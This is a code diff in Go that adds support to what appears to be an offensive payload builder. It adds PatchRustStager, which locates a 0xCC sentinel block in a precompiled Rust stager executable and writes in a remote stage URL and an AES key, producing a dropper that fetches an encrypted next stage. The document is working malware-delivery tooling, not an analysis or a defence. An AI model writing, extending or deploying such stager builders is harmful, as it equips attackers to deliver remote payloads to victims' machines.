@@ -98,3 +98,49 @@ func PatchTemplate(tmpl []byte, cfg Config) ([]byte, error) {
 
 	return out, nil
 }
+
+// Rust stager template support.
+//
+// The precompiled Rust stager (stager-rust) embeds a fixed 320-byte config
+// region: URL(256) + key-b64(64), initialised to all 0xCC as a sentinel. The
+// sentinel is located in the compiled template by scanning for a run of 0xCC
+// (the .data section holds it contiguously) and patched with the real values.
+
+// rustConfigSize is the embedded config block size in the Rust stager template.
+const rustConfigSize = 320
+
+// rustURLSize / rustKeySize split of the Rust config block.
+const (
+	rustURLSize = 256
+	rustKeySize = 64
+)
+
+// PatchRustStager patches the config block of the precompiled Rust stager EXE
+// with the stage URL and base64 AES key. Returns the patched binary.
+func PatchRustStager(tmpl []byte, stageURL, keyB64 string) ([]byte, error) {
+	if len(stageURL) == 0 || len(stageURL) > rustURLSize {
+		return nil, fmt.Errorf("stager: stage URL must be 1..%d bytes", rustURLSize)
+	}
+	if len(keyB64) == 0 || len(keyB64) > rustKeySize {
+		return nil, fmt.Errorf("stager: key must be 1..%d bytes", rustKeySize)
+	}
+
+	// Sentinel: 320 bytes of 0xCC.
+	needle := bytes.Repeat([]byte{0xCC}, rustConfigSize)
+	idx := bytes.Index(tmpl, needle)
+	if idx < 0 {
+		return nil, fmt.Errorf("stager: Rust stager config sentinel not found")
+	}
+
+	out := make([]byte, len(tmpl))
+	copy(out, tmpl)
+	// Clear the config fields first so the bytes after url/key are NUL (the
+	// Rust stager's trim_nul reads up to the first 0; leftover 0xCC sentinel
+	// would corrupt the parsed string).
+	for i := 0; i < rustConfigSize; i++ {
+		out[idx+i] = 0
+	}
+	copy(out[idx:idx+rustURLSize], []byte(stageURL))
+	copy(out[idx+rustURLSize:idx+rustURLSize+rustKeySize], []byte(keyB64))
+	return out, nil
+}
